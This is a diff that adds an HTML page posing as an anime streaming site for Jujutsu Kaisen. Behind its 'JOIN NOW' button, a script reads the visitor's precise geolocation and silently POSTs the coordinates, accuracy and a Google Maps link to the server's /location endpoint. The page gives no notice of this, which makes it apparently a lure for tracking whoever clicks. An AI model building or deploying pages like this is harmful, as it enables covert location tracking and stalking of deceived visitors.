@@ -1,0 +1,150 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Blue lock
+  </title>
+  <link rel="icon" type="jpg" href="./images/ac.jpg">
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+            font-family: 'Roboto', sans-serif;
+        }
+  </style>
+ </head>
+ <body class="bg-black text-white">
+  <header class="flex justify-between items-center p-4 bg-black">
+   <nav class="flex space-x-4">
+    <a class="text-white" href="#">
+     GENRE
+    </a>
+    <a class="text-white" href="#">
+     POPULAR
+    </a>
+   </nav>
+   <button class="bg-blue-500 text-white px-4 py-2 rounded" onclick="getLocation()">
+    JOIN NOW
+   </button>
+  </header>
+  <main class="p-4">
+   <div class="relative">
+    <img alt="Jujutsu Kaisen characters" class="w-full h-64 object-cover rounded-lg" height="400" src="./images/hunter.jpeg" width="800"/>
+    <div class="absolute top-0 left-0 p-4">
+     <div class="text-sm text-gray-400">
+      Season 2 | 2025
+     </div>
+     <h1 class="text-4xl font-bold">
+      Jujutsu Kaisen
+     </h1>
+     <div class="flex items-center space-x-2 mt-2">
+      <div class="flex text-yellow-400">
+       <i class="fas fa-star">
+       </i>
+       <i class="fas fa-star">
+       </i>
+       <i class="fas fa-star">
+       </i>
+       <i class="fas fa-star">
+       </i>
+       <i class="fas fa-star-half-alt">
+       </i>
+      </div>
+      <div class="flex space-x-2">
+       <span class="bg-gray-700 text-white px-2 py-1 rounded-full">
+        Adventure
+       </span>
+       <span class="bg-gray-700 text-white px-2 py-1 rounded-full">
+        Dark fantasy
+       </span>
+       <span class="bg-gray-700 text-white px-2 py-1 rounded-full">
+        Supernatural
+       </span>
+      </div>
+     </div>
+     <p class="mt-4 text-gray-300 max-w-lg">
+      After a boy is thrust into the world of the supernatural, he must rise to the challenge in order to prevent demons from obliterating all that he holds dear.
+     </p>
+     <div class="flex items-center space-x-4 mt-4">
+      <button class="bg-blue-500 text-white px-4 py-2 rounded">
+       WATCH NOW
+      </button>
+     </div>
+    </div>
+   </div>
+   <section class="mt-8">
+    <h2 class="text-2xl font-bold">
+     MOST RECENT ANIME
+    </h2>
+    <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 mt-4">
+     <div>
+      <img alt="Anime cover 1" class="w-full h-auto rounded-lg" height="225" src="https://storage.googleapis.com/a1aa/image/ZSFVBL5t3vROYwcHbo0dvkjtg0025iTjB4lQOR_R3Oo.jpg" width="150"/>
+     </div>
+     <div>
+      <img alt="Anime cover 2" class="w-full h-auto rounded-lg" height="225" src="https://storage.googleapis.com/a1aa/image/CmAUmY5AOMib6ecCaQEjnGmIdL3v8j2lPsouSKVDwtI.jpg" width="150"/>
+     </div>
+     <div>
+      <img alt="Anime cover 3" class="w-full h-auto rounded-lg" height="225" src="https://storage.googleapis.com/a1aa/image/nYECnfVR68Cbz1wLFuuG17OvW5YA0DTw7lYaHafjJO4.jpg" width="150"/>
+     </div>
+     <div>
+      <img alt="Anime cover 4" class="w-full h-auto rounded-lg" height="225" src="https://storage.googleapis.com/a1aa/image/B69HIgmgBppzud48roNvtRTpfyqZXD_u-SGD8smw6DE.jpg" width="150"/>
+     </div>
+     <div>
+      <img alt="Anime cover 5" class="w-full h-auto rounded-lg" height="225" src="https://storage.googleapis.com/a1aa/image/zk3gY4LN28nsvJqvm3C8TKMH3cdWyF4b55arh_XqtpA.jpg" width="150"/>
+     </div>
+    </div>
+   </section>
+  </main>
+
+  	<script type="text/javascript">
+  		function getLocation() {
+  
+  if (!navigator.geolocation) {
+    console.log("Geolocation tidak didukung oleh browser ini");
+    return;
+  }
+  
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+    	const latitude = position.coords.latitude;
+    	const longitude = position.coords.longitude;
+    	const accuracy = position.coords.accuracy;
+
+      const location = {
+        latitude: latitude,
+        longitude: longitude,
+        accuracy: accuracy,
+        url: `https://google.com/maps/search/${latitude},${longitude}`
+      };
+      
+      // Kirim data ke server
+      sendToServer(location);
+    },
+    (error) => {
+    	return;
+    }
+  );
+}
+
+async function sendToServer(location) {
+  try {
+    const response = await fetch('/location', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(location),
+    });
+
+    const data = await response.json();
+    console.log('Respon dari server:', data);
+  } catch (error) {
+    console.error('Error mengirim data:', error);
+  }
+}
+  	</script>
+ </body>
+</html>
